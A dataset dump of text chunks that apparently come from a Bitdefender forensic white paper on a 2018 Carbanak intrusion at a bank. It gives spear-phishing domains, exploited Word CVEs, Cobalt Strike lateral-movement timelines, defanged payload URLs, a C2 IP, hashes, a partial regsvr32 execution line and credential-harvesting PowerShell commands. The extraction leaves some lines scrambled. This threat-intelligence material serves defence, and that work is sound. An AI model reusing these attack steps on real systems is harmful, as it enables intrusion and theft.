        "text": "the Manufacturing Sector\nAs the manufacturing sector continues its digital transformation, Operational Technology (OT), Industrial Control Systems (ICS), and Supervisory Control and Data Acquisition (SCADA) are becoming...\nRead More\n\n\nOverview of the Cyberwarfare used in Israel \u2013 Hamas War\nOn October 7, 2023, the Palestinian organization Hamas launched the biggest attack on Israel in years, resulting in numerous casualties and hostages taken. Israel responded with a large-scale ground...\nRead More\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n                  Stay Informed\n                \n\n\n\n\n\n                  Sign up to receive the latest  security news and trends straight  to your inbox from Trustwave.\n                \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Leadership Team\nOur History\nNews Releases\nMedia Coverage\n\n\n\n\n\n\nCareers\nGlobal Locations\nAwards & Accolades\nTrials & Evaluations\n\n\n\n\n\n\nContact\nSupport\nSecurity Advisories\nSoftware Updates\n\n\n\n\n\n\n\n\n    \n\n\n\n  \n\n\n\n  \n\n\n\n   \n\n\n\n\n\n\n\n\n\n\nLegal\nTerms of Use\nPrivacy Policy\n\n\n\n\n\n\nCopyright \u00a9 2023 Trustwave Holdings, Inc.",
        "source": "Operation Grand Mars_ a comprehensive profile of Carbanak activity in 2016_17.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "White Paper\nAn APT Blueprint:\nGaining New Visibility into\nFinancial Threats\nBitdefender Forensic Investigation Reveals\nComplete Attack Timeline and Behavior of\nNotorious Financial Cyber Criminal GroupWhite Paper\nExecutive Summary\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In mid-2018, Bitdefender researchers investigated a targeted attack on an Eastern European financial institution, gaining new\ninsights and creating a complete event timeline showing how the infamous group Carbanak infiltrates organizations, how it moves\nlaterally across the infrastructure, and the time it takes to set up the actual heist.\n The initial point of compromise found in our investigation involved the use of spear-phishing emails with malicious URLs and\ntainted documents rigged to download a Cobalt Strike beacon component.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Within hours of compromise, the cybercriminal group\nwould begin to move laterally across the infrastructure, identify critical documents and prepare them for exfiltration, and try to\naccess the organization\u2019s ATM and banking applications.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Bitdefender\u2019s forensic analysis revealed some key compromise tactics:\n\u2022 Financial institutions in Eastern Europe remain the primary focus of the criminal group, which uses spear phishing as the\nmain attack vector\n\u2022 The presence of Cobalt Strike hacking tools is the key indicator that the financial institutions were targeted by the Carbanak\ncyber-criminal gang\n\u2022",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In the reconnaissance phase, data related to banking applications and internal procedures was collected and prepared for\nexfiltration, to be used for the final stage of the attack\n\u2022 Infrastructure reconnaissance mainly occurred after business hours or on weekends to avoid triggering security alarms\n\u2022 It only took attackers a couple hours from initial compromise to fully established foothold and lateral movement, showing\nexperience, knowledge and coordination\n\u2022 The final goal of the targeted attack was to compromise the ATM networks, potentially to cash out at ATMs in a coordinated\nphysical and infrastructure criminal operation\nSeveral spear-phishing campaigns attributed to Carbanak, all occurring between March and May 2018, were analyzed by security\nresearchers in 2018.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "These campaigns impersonated emails from high-profile organizations, such as IBM or European Central\nBank, but also cybersecurity companies.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "While most forensic investigations focus on offering a highly technical analysis of the payloads used by the Carbanak group,\nBitdefender\u2019s investigation offers a complete timeline of events, from the moment the email reached the victim\u2019s inbox to the\nmoment of the heist.\n  [2]White Paper\nA History of Criminal Activity\nOne of the most prolific APT-style cyberattacks, specifically targeting the financial sector, is known as Carbanak.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Discovered in\n2014, the campaign quickly gained notoriety after compromising the security systems of 100 banks in 40 countries and stealing\nup to $1 billion in the process.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Banks in countries such as Russia, the United Kingdom, the Netherlands, Spain, Romania, Belarus,\nPoland, Estonia, Bulgaria, Georgia, Moldova, Kyrgyzstan, Armenia, Taiwan and Malaysia have allegedly been targeted with spear-\nphishing emails, luring victims into clicking malicious URLs and executing booby-trapped documents.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The same group is believed to have also been using the Cobalt Strike framework to run sophisticated campaigns, plotting\nand performing financial heists of financial institutions.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Following an investigation led by law enforcement in cooperation with\ncybersecurity companies, the leader of the group was apprehended in Alicante, Spain, on March 26th, 2018.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "However, this action doesn\u2019t appear to have made a dent in the cybercriminal organization, as subsequent spear-phishing campaigns\nseem to have been reported from March until May 2018.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Spearphishing Campaigns Timeline\nMarch 7th-10th Emails sent from fake domains: ibm-cert.com, ibm-warning.com, ibm- notice.com\nMarch 15th Emails impersonated VeriFon (a large POS terminal vendor) and used the fake dns-verifon.com domain.\n March 26th",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "They\nregistered the spamhuas.com domain and cloned the content from the official website (spamhaus. org).\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The group used compromised mail servers of a Swedish company.\n May 18th Impersonated the SWIFT payment system and embedded documents with a JavaScript backdoor. A similar\nattack was used on USA and Europe banks.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A Carbanak trademark in cyberattacks remains the use of Cobalt Strike \u2013 a powerful pentesting tool designed for exploiting and\nexecuting malicious code, simulating post-exploitation actions of advanced threat actors \u2013 which allows them to infiltrate the\norganization, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools. While the end results of such an attack can\nbe easily assessed in financial losses, little information has been publicly available until now on how the attack occurs step-by-step\nwithin a compromised organization.\n [3]White Paper\nModus Operandi\nThe APT-style cybercriminal group has a long track record of successfully targeting financial institutions around the world to either\ncash out at ATMs or perform wire transfers using the bank\u2019s internal systems.\n The spear-phishing emails sent to the financial institutions either end up with victims downloading a tampered document meant to\ndownload the Cobalt Strike beacon or to exploit several unpatched Remote Code Execution Vulnerabilities and deploy a backdoor.\n Once the user attempts to open the attached documents, scripts (Fig. 1) embedded within the files are dropped on the disk and\nautomatically executed in the background. This is a popular technique, sometimes associated with advanced persistent threats\n(APTs) attributed to nation-sponsored threat actors.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "1 - Windows Script Component (.sct) file sample, embedded in spearphishing attachment (md5: bb784d55895db10b67b1b4f1f5b0be16)\nDesigned for stealth infiltration within the targeted system, the attacks use reconnaissance tools designed to assess the state of\nthe victim\u2019s workstation and determine what tools should be downloaded next, or even open decoy documents similar to the one in\nFig.2, to avoid drawing victims\u2019 suspicion.\n Bitdefender\u2019s Investigation, Resulting in a\nComplete Attack Timeline\nBitdefender\u2019s forensics and investigation team was contacted to look into a security incident that started in May 2018 with an email\nreceived by two of the bank\u2019s employees.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The attack target was to gain access to banking systems and eventually withdraw funds in cash from ATMs. The pattern exhibited\nby attackers and their lateral movements across the infrastructure show that they knew what types of information to look for and\nthey were skilled at evasion techniques.\n Judging by the way the adversaries interacted with different systems, the targeted hosts and the documents prepared for\nexfiltration, it appears that the cybercriminal group focused initially on mapping the internal processes and applications of the\naffected institution. They displayed a deep understanding of the nature and location of the data they sought.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "They were able to\nmaintain a low network footprint and avoid suspicion by using selected single workstations as a hub for centralizing collected\ninformation and for communication with their command & control server, outside the regular working hours of the bank.\n After compromising the first victim, the aggressors\u2019 next goal was to find admin-level credentials that would allow them to move\nacross the entire infrastructure. By performing all these operations outside business hours and limiting their interaction to only a\nhandful of systems, the cybercriminal group minimized the detection opportunities.\n [4]White Paper\nA carefully executed network reconnaissance and lateral movement plan was unfolding during this time. What follows is a timeline\nof events that started with the initial spear-phising email.\n Initial compromise\nTwo victims were tricked into opening the spear-phishing attachment, initially compromising two separate endpoints.\n Day 0 (day of initial compromise)\n16:48 \u2013 one of the employees opened the document within the spear-phishing email\n16:49 \u2013 a second employee opened the same tainted document. The document opened by both employees used three\nexploit methods for Remote Code Execution in Microsoft Word: CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "To\ndistract the user from the attack occurring in the background, a decoy document (fig 2) was used. Finally, a backdoor from the\nCommand and Control Server was used to establish persistence in the infrastructure.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "At this point, the adversary had the ability to download and execute new payloads, download additional scripts, run shell commands\nto move laterally in the infrastructure, and delete files from the system and cleaning registry keys to leave fewer forensics traces.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "[5]White Paper\nNetwork lateral movement & data collection\nIn this phase, attackers compromised additional network endpoints, gathering data and using one of the endpoints for collecting\nand storing internal documents that appeared of interest.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Day 0 (continued) 17:05 to 18:20\nAs soon as the first spear-phishing email was accessed, events occurred as follows:\n- Three Microsoft Word exploits (mentioned above) were used;\n- Cobalt Strike beacon was delivered and used to discover and map the organization\u2019s internal network, with the purpose of\ncollecting administrative level credentials;\n- Credentials for one Domain Administrator were compromised and used throughout the duration of the attack;\n- Credentials were \u201ctested\u201d on one of the Domain Controller servers to make sure they\u2019re valid, resulting in its compromise\nAt least two more endpoints were compromised by the end of the day.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Days 1 to 28\nNumerous workstations were systemically compromised in a search for critical information that the cybercriminals could use.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Day 10\nAttack reaches another compromised, which will later be used to store documents related to internal applications, manuals and\nother potentially valuable documents.\n  Day 28\nA series of potentially valuable documents pertaining to internal applications and procedures were identified and prepared for\nexfiltration.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Internal Servers Compromised\nLateral movements and intelligence collection continue, while attackers also target and compromise additional internal hosts and\nservers that will be used during the actual heist.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Between Day 30 to 46, over a period of 17 days, a series of archives were created containing manuals, guides and training materials\nfor different applications.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This information was relevant\nin planning the attack on the bank and, potentially, other banks that share similar systems. The cybercriminal group could be\nactively improving its understanding of internal banking systems by collecting and studying this type of information, in an attempt\nto make their attacks more efficient and stealthier. Their specialization in compromising banking infrastructures could be a direct\nconsequence of intelligence collected and assimilated after each attack on previous financial institutions. This level of intimate\nknowledge of how banking applications work based on stolen documentation, helps them quickly achieve their purpose, which is\nto access and transfer financial assets. The more information they have on the inner workings of banking applications, the easier it\nbecomes to pull off surgical cyber heists and avoid security tripwires.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Day 30 A series of archives were created containing manuals, guides and training materials for different applications.\n The information gathered was archived and organized in different folders.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The connections were initiated\nfrom workstations that had activity after regular office hours.\n Day 33 to 46 A series of archives were created containing manuals, guides and training materials for different applications.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "[6]White Paper\nDay 46 to 63 Using a compromised domain administrator account, attackers remotely dial into various network workstations\nand ultimately remove the archives used to store the baking materials, to cover their tracks\nStarting on Day 33, attackers connected to servers and hosts with access to banking applications. The connections were initiated\nfrom workstations that had activity after regular office hours.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The workstations used to connect to these machines were logged in from and controlled by a workstation that was not part of the\nlegitimate corporate infrastructure.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The system belonged to the adversary and accessed the organization network through a VPN\ntunnel established by the Cobalt Strike beacon component, to contact the internal corporate network systems.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "These command & control connections last between 20 minutes and one hour on average, based on the logs available for forensic\ninvestigation.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The documents prepared for exfiltration, which were relevant to the internal applications, as well as the connections\nto banking applications after regular office hours, point to a financially motivated attack.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Below is a complete lateral movement timeline that includes all major events related to what infrastructure assets were compromised\nand when.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Marked in red are the three major milestones achieved during the attack: the moment the domain controller was\ncompromised, the moment documents started being stored on an internal endpoint, and when the threat actors first connected to\na host with access to banking applications .\n  This lateral movement timeline was compiled based on forensic evidence correlated from several analyzed systems and network\nevents.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is the most relevant blueprint, revealing a complete attack timeline and behavior of the notorious financial cyber-criminal\ngroup when inside an infrastructure belonging to a financial organization.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Lateral Movement Timeline\nDay 0 16:48:53 1st endpoint compromised after opening the spearphishing email\n------16:49:03 2nd endpoint compromised after opening the spearphishing email\n------18:20:00",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "3rd victim - Domain Controller compromise and admin credentials used throughout the duration of the attack\n------18:40:49",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Another endpoint compromised and Cobal Beacon dropped\n------21:02:15 Another endpoint compromised and Cobal Beacon dropped\nDay 1 10:24:07 Another endpoint compromised and used to perform lateral movement\n------13:27:45 Another endpoint compromised\nDay 4 10:19:00 Another endpoint compromised and Cobal Beacon dropped\nDay 7 16:00:00 Another endpoint compromised and Cobal Beacon dropped\n------19:48:01 Another endpoint compromised\nDay 9 01:57:31 Another endpoint compromised\n------16:43:00 Another endpoint compromised\nDay 10 1:30:17 Another endpoint compromised and used to store documents prepared for exfiltration.\n  Day 15 21:39:11 Domain Controller accessed and used remotely dial into various endpoints\nDay 32 13:16:07 Another endpoint compromised\nDay 33 17:00:55",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The moment when attackers connected to a host with access to banking applications.\n Day 34 8:52:18 Another host with access to banking applications was access by the attackers.\n [7]White Paper\nDay 35 15:15:33 Another host with access to banking applications was access by the attackers.\n ------21:40:58 Another endpoint compromised, starts to communicate with C&C\nDay 38 7:54:47 Another endpoint compromised\nDay 45 20:36:38 Another host with access to banking applications was access by the attackers.\n Day 47 20:55:38 Remote desktop into an internal system (compromised)\nDay 53 16:07:29 Another host with access to banking applications was access by the attackers.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Another host with access to banking applications was access by the attackers.\n ------20:45:34 Another host with access to banking applications was access by the attackers.\n Day 55 12:56:28 Another host with access to banking applications was access by the attackers.\n Technical Analysis - experts only\nBelow is a detailed analysis of the key indicators of compromise that helped build the APT timeline. It includes an event timeline\ncompiled from two workstations used in the attack: the one used to compromise the domain controller and the one used to store\nall the network-collected data.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The following events help paint a clear picture of actions immediately after the spear-phishing email attachment was opened, and\nshow how the threat actors move laterally across the infrastructure and how they gathered relevant documentation.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The URL was opened from the body of an email received in a\n\u201cswift-fraud[.]com/documents/94563784.doc\u201d\nspearphishing campaign targeting financial institutions. The Bitdefender research team obtained the document from our Threat\nIntelligence feeds and started analyzing it.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "According to other threat reports, the same URL has been used in delivering other tainted\ndocuments, potentially part of similar campaigns aimed at other financial institutions. This suggests the cybercriminal group may\nhave been delivering multiple documents to victims, potentially laced with other exploits or droppers.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The attack flow leaves behind a temporary file, which was found on two of the systems analyzed in the incident response. This\ntemporary file was created on the filesystem after the opening of the original document file, downloaded from the malicious URL\nmentioned above.\n Analysis of the document on one of the systems reveals the steps involved in compromising the targeted system via the spear\nphishing email. The document contains four objects that are dropped on the filesystem of the victim:\nAttack flow after opening the tampered spearphishing document\nKbhpQIcahFCuZwq.sct - (bb784d55895db10b67b1b4f1f5b0be16)\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is a decoy\nfile, because it acts as a normal document file while the malicious payload is being dropped and executed on\nthe system.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is a\nconfiguration file for cmstp.exe. It downloads a DLL dropper from \u201ccloud[.]yourdocument[.]biz/robots.txt\u201d\n[8]White Paper\nThe DLL Dropper downloaded on step four was not found on the file system and has the role of decrypting and dropping yet another\nJavaScript Dropper on the system.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Before exiting, the DLL will\nself-delete.\n The file can be found at the path\n\u201c303F1428C3F.txt\u201d (eb561d46c6283c632df88bd20ade6df4) C:\\Users\\[redacted]\\\n.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "After decryption, the binary tried\nAppData\\Roaming\\303F1428C3F.txt\nto download a JavaScript backdoor from the Command and Control server (C&C) and\n\u201cnl[.][redacted][.]kz/robots.txt\u201d\nsaved the file to . The backdoor was then executed via\n\u201c%APPDATA%\\9D01CA.txt\u201d \u201c%APPDATA%\\9D01CA.txt\u201d \u201cregsrv32\u201d\n.\n(ex. \u201cregsvr32 /S /N /U",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The file \u201c \u201d sent an initial fingerprint of the system compromised which contained the name of the antivirus solution\n9D01CA.txt\ninstalled on the system, the local IP address, username, computername and OS version. After this communication, the component\nwaited for instructions from the C&C .\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The traffic with the C&C was encrypted and the commands received from the C&C would split into five types:\n: download and execute payload (EXE of DLL)\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "\u25cf \u201cd&exec\u201d\n: download additional scripts (including self-update) and save them in\n\u25cf \u201cmore_eggs\u201d \u201c%APPDATA%\u201d\n: self delete/registry cleanup\n\u25cf \u201cgtfo\u201d\n: runs additional downloaded scripts\n\u25cf \u201cmore_onion\u201d\n: execute command shell commands\n\u25cf \u201cvia_x\u201d\nAll files mentioned in this stage of the attack were created on the system on Day 0 at around 16:49, when the first download link was\naccessed. It is worth mentioning that a binary executable named \u201d, which appeared on the system at a later date,\n\u201crad353F7.tmp\nDay 6, was most certainly downloaded on the system by the Javascript Backdoor .\n \u201c9D01CA.txt\u201d\nDay 0 at 16:48:58 marks the touchdown of a decoy file on two systems.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This file is a decoy because it acts as a normal document\nfile while the malicious payload is being dropped on the system.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "On one of the two workstations, the decoy file has the creation time\nof Day 0 at 16:49:09 (10 seconds later than the other workstation) and the path\nC:\\Users\\[redacted]\\AppData\\Local\\\n. This system shows more stages of the attack, because the adversary used this machine to perform\nTemp\\cqHfjCkTtMwG.doc\nlateral movement and compromise a domain administrator account within two hours of the initial compromise.\n After the compromise of the domain administrator account, a network discovery is performed and systems start to be logged on via\nremote desktop protocol to reach the objective of infiltrating the network and gathering information.\n Below is a complete timeline of events recorded on the workstation that was used to compromise the domain administrator account\nemployed by attackers throughout the lateral movement process.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Day 0\n16:49:03 File create /Users/[redacted]/AppData/Local/Microsoft/Windows/INetCache/Content. Word/~WRF{39EC1EBF-\n71AD-4216-BDC3-66B5DCB833F3}.tmp\n16:49:09 File create \\Users\\[redacted]\\AppData\\Local\\Temp\\cqHfjCkTtMwG.doc\n16:49:10 Faulting application name: EQNEDT32.EXE\n16:49:30 File create C:\\Users\\[redacted]\\AppData\\Local\\Temp\\tCrrDqBQoCcEkbnK.txt\n16:54:00 File create C:\\Users\\[redacted]\\AppData\\Roaming\\303F1428C3F.txt\n16:55:00 File create C:\\Users\\[redacted] \\AppData\\Roaming\\9D01CA.txt\n17:05:33 Powershell script communicated to 185.206.145.227\n17:08:28 Find-LocalAdminAccess\n17:08:54 Get-GPPPassword\n [9]White Paper\n17:21:17 LastUsedTime systeminfo.exe\n17:28:35 Run time for \\Users\\[redacted]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\smrs.\nexe (d68351f754a508a386c06946c8e79088)\n17:46:28 Get-NetComputer\n17:46:29 File create NetComputer.txt\n17:48:10 Invoke-EnumerateLocalAdmin\n17:48:26 Find-LocalAdminAccess\n17:48:27 File create LocalAdminAccess.txt\n17:56:12 Invoke-EnumerateLocalAdmin\n17:57:03 File create EnumerateLocalAdmin.csv\n18:15:53 PowerShell console is starting up\n18:17:52 to 18:23:38\nThe legitimate jusched.exe is replaced with the jusched.exe (d68351f754a508a386c06946c8e79088) beacon\ndownloader\n18:44:39 File create \\Users\\Public\\[redacted].txt\n18:55:56 Run time for \\Users\\[redacted]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\smrs.\nexe (d68351f754a508a386c06946c8e79088)\n18:55:56 LastUsedTime: C:\\Windows\\system32\\cmd.exe\n18:55:56 Run time for taskkill.exe\n22:54:57 LastUsedTime: C:\\Windows\\system32\\PING.EXE\nDay 1\n10:19:15 Powershell run with content from pipe_8080\n10:24:07 A service was installed in the system.\n",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Run time for powershell.exe\n13:00:48 Failed attempts to connect to five internal systems\n13:26:53 Run time for net1.exe\nDay 2\n17:48:59 Run time for nslookup.exe\nDay 5\n12:07:49 Powershell script communicated to C2 server\n13:28:37 Powershell script communicated to C2 server\n13:38:45 Powershell script communicated to C2 server\n15:49:08 File create C:\\Users\\[redacted]\\AppData\\Roaming\\rad353F7.tmp\n [10]White Paper\n17:08:40 Execution on file path: C:\\Users\\[redacted]\\AppData\\Roaming\\rad353F7.tmp\n17:08:41 Run time for C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nDay 27\n08:26:22 FileKeyLastWriteTimestamp mstsc.exe\nDay 46\n11:33:47 Run time for jusched.exe\nDay 58\n09:06:33 Failed attempts to connect to several internal systems.",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "330 events: 322 target a single system ; 4 target a\nsecond system ; 4 target a third system .\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "358 events: 349 target a single system ; 5 target a\nsecond system; 5 target a third system.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Day 60\n08:33:50 Failed attempts to connect to several internal systems. (355) target a single system ; 5 target a second system;\n5 target a third system\nDay 63\n08:13:37 Failed attempts to connect to several internal systems. (304) target a single system ; 7 target a second system;\n7 target a third system\nThe full list of components and their corresponding hashes can be found in the IoC section below.\n ",
        "source": "Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf",
        "detection": {},
